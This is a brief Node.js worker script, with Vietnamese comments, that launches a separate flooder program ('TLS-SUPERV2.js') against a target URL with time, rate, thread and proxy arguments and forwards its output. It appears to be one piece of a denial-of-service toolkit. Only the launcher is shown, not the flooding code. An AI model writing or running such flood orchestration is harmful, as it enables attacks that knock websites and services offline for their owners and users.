const { parentPort, workerData } = require('worker_threads');
const { spawn } = require('child_process');

// Nhận dữ liệu từ workerData
const { url, time, rate, thea, proxy } = workerData;

// Hàm chạy flooder.js
function runFlooder() {
    const flooder = spawn('node', ['TLS-SUPERV2.js', url, time, rate, thea, proxy]);

    flooder.stdout.on('data', (data) => {
        parentPort.postMessage(`Output: ${data}`);
    });

    flooder.stderr.on('data', (data) => {
        parentPort.postMessage(`Error: ${data}`);
    });
}

// Chạy flooder
runFlooder();
